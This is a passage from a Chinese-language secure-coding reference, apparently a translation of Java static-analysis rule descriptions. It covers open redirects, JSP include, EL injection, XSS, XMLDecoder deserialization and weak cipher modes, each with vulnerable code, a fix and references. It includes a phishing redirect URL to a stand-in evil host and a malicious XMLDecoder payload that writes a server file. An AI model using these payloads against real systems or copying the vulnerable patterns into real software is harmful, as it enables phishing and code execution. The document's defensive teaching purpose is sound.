rel="noopener">OWASP: Top 10 2013-A10: Unvalidated Redirects and Forwards</a><br><a href="https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet" target="_blank" rel="noopener">OWASP: Unvalidated Redirects and Forwards Cheat Sheet</a><br><a href="http://cwe.mitre.org/data/definitions/601.html" target="_blank" rel="noopener">CWE-601: URL Redirection to Untrusted Site (‘Open Redirect’)</a></p><h1 id="未验证的重定向-Play-Framework"><a href="#未验证的重定向-Play-Framework" class="headerlink" title="未验证的重定向(Play Framework)"></a>未验证的重定向(Play Framework)</h1><p>漏洞特征：PLAY_UNVALIDATED_REDIRECT<br>未验证重定向漏洞是因为应用跳转到用户输入的指定目标url，这个输入的参数没有被充分的验证。这个漏洞可能会被用来钓鱼</p><p>假设的场景：</p><ol><li>用户被欺骗点了恶意链接：<a href="http://website.com/login?redirect=http://evil.vvebsite.com/fake/login" target="_blank" rel="noopener">http://website.com/login?redirect=http://evil.vvebsite.com/fake/login</a></li><li>用户被重定向到了一个虚假的登录页面，这样页面看起来就像真的一样(<a href="http://evil.vvebsite.com/fake/login" target="_blank" rel="noopener">http://evil.vvebsite.com/fake/login</a>)</li><li>用户输入了他的凭据</li><li>恶意网站偷走了用户的凭据，并且跳转回了原来的网站</li></ol><p>这个攻击貌似是合理的，因为大多数用户在被重定向之后不会再次检查url。而且跳转到授权页面也是很普遍的现象。<br>漏洞代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def login(redirectUrl:String) = Action &#123;</span><br><span class="line">    [...]</span><br><span class="line">    Redirect(url)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解决方案/对策</p><ul><li>不要从用户的输入中接受重定向的目的url</li><li>接受一个目的地址的key，这个key可以查询到一个合法的目的地址。</li><li>仅接受相对路径</li><li>urls白名单（如果可行的话）</li><li>验证url开始的部分是否在白名单里面</li></ul><p>引用：<br>[WASC-38: URL Redirector Abuse](<a href="http://projects.webappsec.org/w/page/13246981/URL" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246981/URL</a> Redirector Abuse)<br><a href="https://www.owasp.org/index.php/Top_10_2013-A10-Unvalidated_Redirects_and_Forwards" target="_blank" rel="noopener">OWASP: Top 10 2013-A10: Unvalidated Redirects and Forwards</a><br><a href="https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet" target="_blank" rel="noopener">OWASP: Unvalidated Redirects and Forwards Cheat Sheet</a><br><a href="http://cwe.mitre.org/data/definitions/601.html" target="_blank" rel="noopener">CWE-601: URL Redirection to Untrusted Site (‘Open Redirect’)</a></p><h1 id="Spring中未验证的重定向"><a href="#Spring中未验证的重定向" class="headerlink" title="Spring中未验证的重定向"></a>Spring中未验证的重定向</h1><p>漏洞特征：SPRING_UNVALIDATED_REDIRECT<br>未验证重定向漏洞是因为应用跳转到用户输入的指定目标url，这个输入的参数没有被充分的验证。这个漏洞可能会被用来钓鱼</p><p>假设的场景：</p><ol><li>用户被欺骗点了恶意链接：<a href="http://website.com/login?redirect=http://evil.vvebsite.com/fake/login" target="_blank" rel="noopener">http://website.com/login?redirect=http://evil.vvebsite.com/fake/login</a></li><li>用户被重定向到了一个虚假的登录页面，这样页面看起来就像真的一样(<a href="http://evil.vvebsite.com/fake/login" target="_blank" rel="noopener">http://evil.vvebsite.com/fake/login</a>)</li><li>用户输入了他的凭据</li><li>恶意网站偷走了用户的凭据，并且跳转回了原来的网站</li></ol><p>这个攻击貌似是合理的，因为大多数用户在被重定向之后不会再次检查url。而且跳转到授权页面也是很普遍的现象。<br>漏洞代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(&quot;/redirect&quot;)</span><br><span class="line">public String redirect(@RequestParam(&quot;url&quot;) String url) &#123;</span><br><span class="line">    [...]</span><br><span class="line">    return &quot;redirect:&quot; + url;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解决方案/对策</p><ul><li>不要从用户的输入中接受重定向的目的url</li><li>接受一个目的地址的key，这个key可以查询到一个合法的目的地址。</li><li>仅接受相对路径</li><li>urls白名单（如果可行的话）</li><li>验证url开始的部分是否在白名单里面</li></ul><p>引用：<br>[WASC-38: URL Redirector Abuse](<a href="http://projects.webappsec.org/w/page/13246981/URL" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246981/URL</a> Redirector Abuse)<br><a href="https://www.owasp.org/index.php/Top_10_2013-A10-Unvalidated_Redirects_and_Forwards" target="_blank" rel="noopener">OWASP: Top 10 2013-A10: Unvalidated Redirects and Forwards</a><br><a href="https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet" target="_blank" rel="noopener">OWASP: Unvalidated Redirects and Forwards Cheat Sheet</a><br><a href="http://cwe.mitre.org/data/definitions/601.html" target="_blank" rel="noopener">CWE-601: URL Redirection to Untrusted Site (‘Open Redirect’)</a></p><h1 id="jsp动态包含"><a href="#jsp动态包含" class="headerlink" title="jsp动态包含"></a>jsp动态包含</h1><p>漏洞特征：JSP_INCLUDE<br>jsp允许动态包含文件。这可能允许攻击者控制jsp的文件包含。如果出现这样的漏洞的话，攻击者就会包含一个他能控制到的文件。通过直接包含文件，攻击者就能执行任意代码。<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:include page=&quot;$&#123;param.secret_param&#125;&quot; /&gt;</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;c:if test=&quot;$&#123;param.secret_param == &apos;page1&apos;&#125;&quot;&gt;</span><br><span class="line">    &lt;jsp:include page=&quot;page1.jsp&quot; /&gt;</span><br><span class="line">&lt;/c:if&gt;</span><br></pre></td></tr></table></figure><p>引用：</p><p><a href="http://resources.infosecinstitute.com/file-inclusion-attacks/" target="_blank" rel="noopener">InfosecInstitute: File Inclusion Attacks</a><br>[WASC-05: Remote File Inclusion](<a href="http://projects.webappsec.org/w/page/13246955/Remote" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246955/Remote</a> File Inclusion)</p><h1 id="Spring-表达式中的动态变量"><a href="#Spring-表达式中的动态变量" class="headerlink" title="Spring 表达式中的动态变量"></a>Spring 表达式中的动态变量</h1><p>漏洞特征：JSP_SPRING_EVAL<br>Spring使用动态值构建。应该严格检验源数据，以避免未过滤的数据进入到危险函数中。<br>有漏洞的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ taglib prefix=&quot;spring&quot; uri=&quot;http://www.springframework.org/tags&quot; %&gt;</span><br><span class="line"></span><br><span class="line">&lt;spring:eval expression=&quot;$&#123;param.lang&#125;&quot; var=&quot;lang&quot; /&gt;</span><br><span class="line">&lt;%@ taglib prefix=&quot;spring&quot; uri=&quot;http://www.springframework.org/tags&quot; %&gt;</span><br><span class="line"></span><br><span class="line">&lt;spring:eval expression=&quot;&apos;$&#123;param.lang&#125;&apos;==&apos;fr&apos;&quot; var=&quot;languageIsFrench&quot; /&gt;</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;c:set var=&quot;lang&quot; value=&quot;$&#123;param.lang&#125;&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;c:set var=&quot;languageIsFrench&quot; value=&quot;$&#123;param.lang == &apos;fr&apos;&#125;&quot;/&gt;</span><br></pre></td></tr></table></figure><p>引用：<br><a href="http://cwe.mitre.org/data/definitions/94.html" target="_blank" rel="noopener">CWE-94: Improper Control of Generation of Code (‘Code Injection’)</a><br><a href="http://cwe.mitre.org/data/definitions/95.html" target="_blank" rel="noopener">CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code (‘Eval Injection’)</a></p><h1 id="xml字符转义被禁用"><a href="#xml字符转义被禁用" class="headerlink" title="xml字符转义被禁用"></a>xml字符转义被禁用</h1><p>漏洞特征：JSP_JSTL_OUT<br>可能会有潜在的xss漏洞。这可能会在客户端执行未期望的JavaScript。（见引用）<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ taglib prefix=&quot;c&quot; uri=&quot;http://java.sun.com/jsp/jstl/core&quot; %&gt;</span><br><span class="line"></span><br><span class="line">&lt;c:out value=&quot;$&#123;param.test_param&#125;&quot; escapeXml=&quot;false&quot;/&gt;</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ taglib prefix=&quot;c&quot; uri=&quot;http://java.sun.com/jsp/jstl/core&quot; %&gt;</span><br><span class="line"></span><br><span class="line">&lt;c:out value=&quot;$&#123;param.test_param&#125;&quot;/&gt;</span><br></pre></td></tr></table></figure><p>引用：<br>[WASC-8: Cross Site Scripting](<a href="http://projects.webappsec.org/w/page/13246920/Cross" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246920/Cross</a> Site Scripting)<br><a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet" target="_blank" rel="noopener">OWASP: XSS Prevention Cheat Sheet</a><br><a href="https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)" target="_blank" rel="noopener">OWASP: Top 10 2013-A3: Cross-Site Scripting (XSS)</a><br><a href="http://cwe.mitre.org/data/definitions/79.html" target="_blank" rel="noopener">CWE-79: Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)</a><br><a href="http://docs.oracle.com/javaee/5/jstl/1.1/docs/tlddocs/c/out.html" target="_blank" rel="noopener">JSTL Javadoc: Out tag</a></p><h1 id="jsp中潜在的xss"><a href="#jsp中潜在的xss" class="headerlink" title="jsp中潜在的xss"></a>jsp中潜在的xss</h1><p>漏洞特征：XSS_JSP_PRINT<br>可能会有潜在的xss漏洞。这可能会在客户端执行未期望的JavaScript。（见引用）<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">String taintedInput = (String) request.getAttribute(&quot;input&quot;);</span><br><span class="line">%&gt;</span><br><span class="line">[...]</span><br><span class="line">&lt;%= taintedInput %&gt;</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">String taintedInput = (String) request.getAttribute(&quot;input&quot;);</span><br><span class="line">%&gt;</span><br><span class="line">[...]</span><br><span class="line">&lt;%= Encode.forHtml(taintedInput) %&gt;</span><br></pre></td></tr></table></figure><p>抵御xss最好的方式是像上面在输出中编码特殊的字符。有4种环境类型要考虑：HTML, JavaScript, CSS (styles), 和URLs.请遵守OWASP XSS Prevention备忘录中定义的xss保护规则，里面会介绍一些防御的细节。<br>引用：<br>[WASC-8: Cross Site Scripting](<a href="http://projects.webappsec.org/w/page/13246920/Cross" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246920/Cross</a> Site Scripting)<br><a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet" target="_blank" rel="noopener">OWASP: XSS Prevention Cheat Sheet</a><br><a href="https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)" target="_blank" rel="noopener">OWASP: Top 10 2013-A3: Cross-Site Scripting (XSS)</a><br><a href="http://cwe.mitre.org/data/definitions/79.html" target="_blank" rel="noopener">CWE-79: Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)</a><br><a href="https://code.google.com/p/owasp-java-encoder/" target="_blank" rel="noopener">OWASP Java Encoder</a></p><h1 id="Servlet中潜在的xss"><a href="#Servlet中潜在的xss" class="headerlink" title="Servlet中潜在的xss"></a>Servlet中潜在的xss</h1><p>漏洞特征：XSS_SERVLET<br>可能会有潜在的xss漏洞。这可能会在客户端执行未期望的JavaScript。（见引用）<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class="line">    String input1 = req.getParameter(&quot;input1&quot;);</span><br><span class="line">    [...]</span><br><span class="line">    resp.getWriter().write(input1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class="line">    String input1 = req.getParameter(&quot;input1&quot;);</span><br><span class="line">    [...]</span><br><span class="line">    resp.getWriter().write(Encode.forHtml(input1));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>抵御xss最好的方式是像上面在输出中编码特殊的字符。有4种环境类型要考虑：HTML, JavaScript, CSS (styles), 和URLs.请遵守OWASP XSS Prevention备忘录中定义的xss保护规则，里面会介绍一些防御的细节。<br>注意Servlet中的xss规则看着都很类似，但是要用不同的规则寻找‘XSS：Servlet反射型xss’和‘xss:在Servlet错误页面中反射型xss’</p><p>引用：<br>[WASC-8: Cross Site Scripting](<a href="http://projects.webappsec.org/w/page/13246920/Cross" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246920/Cross</a> Site Scripting)<br><a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet" target="_blank" rel="noopener">OWASP: XSS Prevention Cheat Sheet</a><br><a href="https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)" target="_blank" rel="noopener">OWASP: Top 10 2013-A3: Cross-Site Scripting (XSS)</a><br><a href="http://cwe.mitre.org/data/definitions/79.html" target="_blank" rel="noopener">CWE-79: Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)</a><br><a href="https://code.google.com/p/owasp-java-encoder/" target="_blank" rel="noopener">OWASP Java Encoder</a></p><h1 id="XMLDecoder的使用"><a href="#XMLDecoder的使用" class="headerlink" title="XMLDecoder的使用"></a>XMLDecoder的使用</h1><p>漏洞规则：XML_DECODER<br>不应该用XMLDecoder解析不受信任的数据。反序列化用户输入数据会导致代码执行。这是因为XMLDecoder 支持任意的方法调用。这个功能旨在调用setter方法，但是实际上，这个功能什么方法都能调用。<br>恶意的xml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">  &lt;object class=&quot;java.io.PrintWriter&quot;&gt;</span><br><span class="line">    &lt;string&gt;/tmp/Hacked.txt&lt;/string&gt;</span><br><span class="line">    &lt;void method=&quot;println&quot;&gt;</span><br><span class="line">      &lt;string&gt;Hello World!&lt;/string&gt;</span><br><span class="line">    &lt;/void&gt;</span><br><span class="line">    &lt;void method=&quot;close&quot;/&gt;</span><br><span class="line">  &lt;/object&gt;</span><br><span class="line">&lt;/java&gt;</span><br></pre></td></tr></table></figure><p>上面这个xml代码可能会在服务器中创建一个内容为”Hello World!”.的文件。</p><p>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">XMLDecoder d = new XMLDecoder(in);</span><br><span class="line">try &#123;</span><br><span class="line">    Object result = d.readObject();</span><br><span class="line">&#125;</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>解决方案：<br>解决方案是避免使用XMLDecoder去解析不受信任的用户输入数据</p><p>引用：<br><a href="http://blog.diniscruz.com/2013/08/using-xmldecoder-to-execute-server-side.html" target="_blank" rel="noopener">Dinis Cruz Blog: Using XMLDecoder to execute server-side Java Code on an Restlet application</a><br><a href="https://securityblog.redhat.com/2014/01/23/java-deserialization-flaws-part-2-xml-deserialization/" target="_blank" rel="noopener">RedHat blog : Java deserialization flaws: Part 2, XML deserialization</a><br><a href="http://cwe.mitre.org/data/definitions/20.html" target="_blank" rel="noopener">CWE-20: Improper Input Validation</a></p><h1 id="固定IV"><a href="#固定IV" class="headerlink" title="固定IV"></a>固定IV</h1><p>漏洞规则：STATIC_IV<br>每一条消息都应该为它初始化生成一个新的加密向量<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">private static byte[] IV = new byte[16] &#123;(byte)0,(byte)1,(byte)2,[...]&#125;;</span><br><span class="line"></span><br><span class="line">public void encrypt(String message) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">    IvParameterSpec ivSpec = new IvParameterSpec(IV);</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>解决方案:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public void encrypt(String message) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">    byte[] iv = new byte[16];</span><br><span class="line">    new SecureRandom().nextBytes(iv);</span><br><span class="line"></span><br><span class="line">    IvParameterSpec ivSpec = new IvParameterSpec(iv);</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>引用：<br><a href="http://en.wikipedia.org/wiki/Initialization_vector" target="_blank" rel="noopener">Wikipedia: Initialization vector</a><br><a href="http://cwe.mitre.org/data/definitions/329.html" target="_blank" rel="noopener">CWE-329: Not Using a Random IV with CBC Mode</a><br><a href="https://defuse.ca/cbcmodeiv.htm" target="_blank" rel="noopener">Encryption - CBC Mode IV: Secret or Not?</a></p><h1 id="ECB模式是不安全的"><a href="#ECB模式是不安全的" class="headerlink" title="ECB模式是不安全的"></a>ECB模式是不安全的</h1><p>漏洞规则： ECB_MODE</p><p>提供了最好机密性的授权加密模式应该替换电码本模式(Electronic Codebook Book (ECB))，因为ecb没有提供很好的机密性。尤其，在ecb模式下，输入相同的数据，每一次的输出也是相同的。所以，如果用户发送一个密码，它的加密值每次都是相同的。这允许攻击者可以去拦截并且也可也重放这些数据<br>为了修复这个。一些像Galois/Counter Mode (GCM)也应该被替换<br>有漏洞的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cipher c = Cipher.getInstance(&quot;AES/ECB/NoPadding&quot;);</span><br><span class="line">c.init(Cipher.ENCRYPT_MODE, k, iv);</span><br><span class="line">byte[] cipherText = c.doFinal(plainText);</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cipher c = Cipher.getInstance(&quot;AES/GCM/NoPadding&quot;);</span><br><span class="line">c.init(Cipher.ENCRYPT_MODE, k, iv);</span><br><span class="line">byte[] cipherText = c.doFinal(plainText);</span><br></pre></td></tr></table></figure><p>引用：<br><a href="http://en.wikipedia.org/wiki/Authenticated_encryption" target="_blank" rel="noopener">Wikipedia: Authenticated encryption</a><br><a href="http://csrc.nist.gov/groups/ST/toolkit/BCM/modes_development.html#01" target="_blank" rel="noopener">NIST: Authenticated Encryption Modes</a><br><a href="http://en.wikipedia.org/wiki/Block_cipher_modes_of_operation#Electronic_codebook_.28ECB.29" target="_blank" rel="noopener">Wikipedia: Block cipher modes of operation</a><br><a href="http://csrc.nist.gov/publications/nistpubs/800-38a/sp800-38a.pdf" target="_blank" rel="noopener">NIST: Recommendation for Block Cipher Modes of Operation</a></p><h1 id="加密容易受到Padding-Oracle的影响"><a href="#加密容易受到Padding-Oracle的影响" class="headerlink" title="加密容易受到Padding Oracle的影响"></a>加密容易受到Padding Oracle的影响</h1><p>漏洞特征：PADDING_ORACLE<br>具有PKCS5Padding的CBC特定模式容易受到padding oracle攻击。如果系统暴露了的明文数据与有效padding或无效padding之间的差异。那么攻击者就可能会解密数据。有效padding和无效padding的差别通常可以通过每一次返回的报错信息来揭露。<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cipher c = Cipher.getInstance(&quot;AES/CBC/PKCS5Padding&quot;);</span><br><span class="line">c.init(Cipher.ENCRYPT_MODE, k, iv);</span><br><span class="line">byte[] cipherText = c.doFinal(plainText);</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cipher c = Cipher.getInstance(&quot;AES/GCM/NoPadding&quot;);</span><br><span class="line">c.init(Cipher.ENCRYPT_MODE, k, iv);</span><br><span class="line">byte[] cipherText = c.doFinal(plainText);</span><br></pre></td></tr></table></figure><p>引用：<br><a href="http://www.infobytesec.com/down/paddingoracle_openjam.pdf" target="_blank" rel="noopener">Padding Oracles for the masses (by Matias Soler)</a><br><a href="http://en.wikipedia.org/wiki/Authenticated_encryption" target="_blank" rel="noopener">Wikipedia: Authenticated encryption</a><br><a href="http://csrc.nist.gov/groups/ST/toolkit/BCM/modes_development.html#01/" target="_blank" rel="noopener">NIST: Authenticated Encryption Modes</a><br><a href="http://capec.mitre.org/data/definitions/463.html" target="_blank" rel="noopener">CAPEC: Padding Oracle Crypto Attack</a><br><a href="http://cwe.mitre.org/data/definitions/696.html" target="_blank" rel="noopener">CWE-696: Incorrect Behavior Order</a></p><h1 id="密码没有完整性"><a href="#密码没有完整性" class="headerlink" title="密码没有完整性"></a>密码没有完整性</h1><p>漏洞特征：CIPHER_INTEGRITY<br>产生的密文容易被对手改变。这就意味着，加密提供者没法发现数据是否遭到篡改。如果加密数据被攻击者控制，那么它可能会被偷偷改掉。<br>解决方案通常是加密数据通常包含基本的身份验证hash(HMAC) 去签名数据。把HMAC方法和现有的加密方式结合容易出错。尤其，推荐你要首先去验证HMAC，并且如果数据没有被篡改，你才能执行所有的解密操作。<br>如果没有提供HMAC，下面的模式都是有漏洞的：</p><ul><li>CBC</li><li>OFB</li><li>CTR</li><li>ECB<br>下面的片段是一些有漏洞的代码:<br>有漏洞的代码<br>aes的cbc模式</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cipher c = Cipher.getInstance(&quot;AES/CBC/PKCS5Padding&quot;);</span><br><span class="line">c.init(Cipher.ENCRYPT_MODE, k, iv);</span><br><span class="line">byte[] cipherText = c.doFinal(plainText);</span><br></pre></td></tr></table></figure><p>三次DES的ECB模式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cipher c = Cipher.getInstance(&quot;DESede/ECB/PKCS5Padding&quot;);</span><br><span class="line">c.init(Cipher.ENCRYPT_MODE, k, iv);</span><br><span class="line">byte[] cipherText = c.doFinal(plainText);</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cipher c = Cipher.getInstance(&quot;AES/GCM/NoPadding&quot;);</span><br><span class="line">c.init(Cipher.ENCRYPT_MODE, k, iv);</span><br><span class="line">byte[] cipherText = c.doFinal(plainText);</span><br></pre></td></tr></table></figure><p>在上面这个例子中，GCM模式把HMAC引入到加密数据的结果之中，提供了结果的完整性<br>引用：<br><a href="http://en.wikipedia.org/wiki/Authenticated_encryption" target="_blank" rel="noopener">Wikipedia: Authenticated encryption</a><br><a href="http://csrc.nist.gov/groups/ST/toolkit/BCM/modes_development.html#01" target="_blank" rel="noopener">NIST: Authenticated Encryption Modes</a><br><a href="http://www.thoughtcrime.org/blog/the-cryptographic-doom-principle/" target="_blank" rel="noopener">Moxie Marlinspike’s blog: The Cryptographic Doom Principle</a><br><a href="http://cwe.mitre.org/data/definitions/353.html" target="_blank" rel="noopener">CWE-353: Missing Support for Integrity Check</a></p><h1 id="使用ESAPI加密"><a href="#使用ESAPI加密" class="headerlink" title="使用ESAPI加密"></a>使用ESAPI加密</h1><p>漏洞规则：ESAPI_ENCRYPTOR<br>ESAPI的加密组件在历史上有一些小的漏洞。这里有一个能够快速验证的列表，以保证授权的加密是以期望的方式运行的。</p><ol><li>库的版本</li></ol><p>这个问题在2.1.0这个版本被修正。在2.0.1版本以下有漏洞可以绕过MAC（CVE-2013-5679）<br>对于Maven使用者，使用下面的命令可以查看插件的版本。有效的ESAPI将会被输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mvn versions:display-dependency-updates</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[...]</span><br><span class="line">[INFO] The following dependencies in Dependencies have newer versions:</span><br><span class="line">[INFO]   org.slf4j:slf4j-api ................................... 1.6.4 -&gt; 1.7.7</span><br><span class="line">[INFO]   org.owasp.esapi:esapi ................................. 2.0.1 -&gt; 2.1.0</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>或者可以直接查看配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.owasp.esapi&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;esapi&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;2.1.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>对于Ant使用者，应该使用 <a href="http://repo1.maven.org/maven2/org/owasp/esapi/esapi/2.1.0/esapi-2.1.0.jar" target="_blank" rel="noopener">esapi-2.1.0.jar</a> 这个jar。</p><p>2.配置<br>在2.1.0这个版本中，在密文定义中，密钥的改变会导致漏洞(CVE-2013-5960)。需要使用一些预防措施。<br>如果存在以下任何元素，那么ESAPI的加密算法就是有问题的<br>不安全的配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Encryptor.CipherText.useMAC=false</span><br><span class="line"></span><br><span class="line">Encryptor.EncryptionAlgorithm=AES</span><br><span class="line">Encryptor.CipherTransformation=AES/CBC/PKCS5Padding</span><br><span class="line"></span><br><span class="line">Encryptor.cipher_modes.additional_allowed=CBC</span><br></pre></td></tr></table></figure><p>安全的配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#Needed</span><br><span class="line">Encryptor.CipherText.useMAC=true</span><br><span class="line"></span><br><span class="line">#Needed to have a solid auth. encryption</span><br><span class="line">Encryptor.EncryptionAlgorithm=AES</span><br><span class="line">Encryptor.CipherTransformation=AES/GCM/NoPadding</span><br><span class="line"></span><br><span class="line">#CBC mode should be removed to avoid padding oracle</span><br><span class="line">Encryptor.cipher_modes.additional_allowed=</span><br></pre></td></tr></table></figure><p>引用：<br><a href="http://owasp-esapi-java.googlecode.com/svn/trunk/documentation/ESAPI-security-bulletin1.pdf" target="_blank" rel="noopener">ESAPI Security bulletin 1 